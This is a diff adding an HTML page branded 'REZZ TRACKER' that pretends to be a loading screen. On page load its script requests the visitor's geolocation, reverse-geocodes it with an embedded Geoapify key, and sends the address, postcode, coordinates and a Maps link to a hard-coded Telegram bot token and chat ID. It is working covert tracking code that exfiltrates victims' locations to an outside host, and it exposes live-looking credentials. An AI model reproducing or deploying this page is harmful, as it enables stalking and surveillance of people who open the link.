@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title> хаха </title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+      padding: 30px;
+    }
+  </style>
+</head>
+<body>
+  <h2>LOADING PLEASE WAIT...</h2>
+
+  <script>
+    const botToken = "7636452500:AAGZgLUeKAGLjq0IlvfB-sNb_JE48fsKK90";
+    const chatId = "8122699796";
+    const geoapifyKey = "b73fc8bd66084a25947c8aed6f6804fc";
+
+    function sendMessageToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text
+        })
+      });
+    }
+
+    function formatTime() {
+      const now = new Date();
+      const tgl = now.toLocaleDateString("id-ID");
+      const jam = now.toLocaleTimeString("id-ID");
+      return `${tgl} ${jam} WIB`;
+    }
+
+    function getAlamat(lat, lon) {
+      fetch(`https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=${geoapifyKey}`)
+        .then(res => res.json())
+        .then(data => {
+          const info = data.features[0].properties;
+          const alamat = info.address_line1 || "-";
+          const kota = info.city || info.county || "-";
+          const prov = info.state || "-";
+          const negara = info.country || "-";
+          const kodepos = info.postcode || "-";
+          const link = `https://maps.google.com?q=${lat},${lon}`;
+          const waktu = formatTime();
+
+          const message = `❏━━━━[ REZZ TRACKER ]━━━━❏
+┏━━━━━━━━━━━━━━━━━━━━━━━┓
+┃NAMA         : @rezzxiterz
+┃DEVELOPER    : REZZ XITERZ
+┃WAKTU        : ${waktu}
+┃STATUS       : ONLINE
+┃ID TELEGRAM  : 8122699796
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+   [ Твои оскорбления ничего для меня не значат ]
+❏━━━━━━━━━━━━━━━━━━━━━━━❏
+ ALAMAT       : ${alamat}
+ KOTA         : ${kota}
+ PROVINSI     : ${prov}
+ NEGARA       : ${negara}
+ KODE POS     : ${kodepos}
+ KOORDINAT    : ${lat}, ${lon}
+ GOOGLE MAPS  : ${link}
+❏━━━━━━━━━━━━━━━━━━━━━━━❏`;
+
+          sendMessageToTelegram(message);
+          document.body.innerHTML = "<h2>LOADING..</h2>";
+        })
+        .catch(err => {
+          document.body.innerHTML = "<h2>EROR ANJ</h2><p>" + err.message + "</p>";
+        });
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        getAlamat(lat, lon);
+      },
+      (err) => {
+        document.body.innerHTML = "<h2>ERORR</h2><p>" + err.message + "</p>";
+      }
+    );
+  </script>
+</body>
+</html>
